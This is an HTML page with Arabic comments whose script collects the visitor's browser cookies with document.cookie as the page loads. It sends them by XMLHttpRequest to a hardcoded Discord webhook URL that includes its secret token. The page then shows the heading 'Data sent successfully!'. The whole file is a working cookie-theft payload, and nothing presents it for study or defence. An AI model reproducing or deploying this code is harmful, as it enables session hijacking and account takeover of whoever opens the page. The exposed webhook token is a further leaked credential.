<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال الكوكيز إلى بوت Discord</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2c2f33;
            color: white;
            text-align: center;
            padding: 50px;
        }
    </style>
</head>
<body>

    <h1>تم إرسال البيانات بنجاح!</h1>

    <script>
        // دالة لجلب الكوكيز من المتصفح
        function getCookies() {
            return document.cookie; // جلب جميع الكوكيز في المتصفح
        }

        // جلب الكوكيز
        const cookies = getCookies();

        // إذا كانت الكوكيز موجودة، نقوم بإرسالها
        if (cookies) {
            sendData(cookies); // إرسال الكوكيز إلى Webhook
        } else {
            console.log("لا توجد كوكيز");
        }

        // دالة لإرسال البيانات إلى Webhook
        function sendData(cookies) {
            const data = {
                content: `تم إرسال الكوكيز: ${cookies}`
            };

            const xhr = new XMLHttpRequest();
            xhr.open("POST", "https://discord.com/api/webhooks/1315420160030412821/PM8Cic_rvPk811Jl1rGerqT_KjycvUvAv4wvMjppH0mD3xNEZtnF8MX4sVTt9b8_4bYP", true);
            xhr.setRequestHeader("Content-Type", "application/json");

            xhr.onload = function () {
                if (xhr.status === 204) {
                    console.log("تم إرسال الكوكيز بنجاح.");
                } else {
                    console.log("حدث خطأ أثناء إرسال الكوكيز.");
                }
            };

            xhr.send(JSON.stringify(data));  // إرسال البيانات
        }
    </script>

</body>
</html>
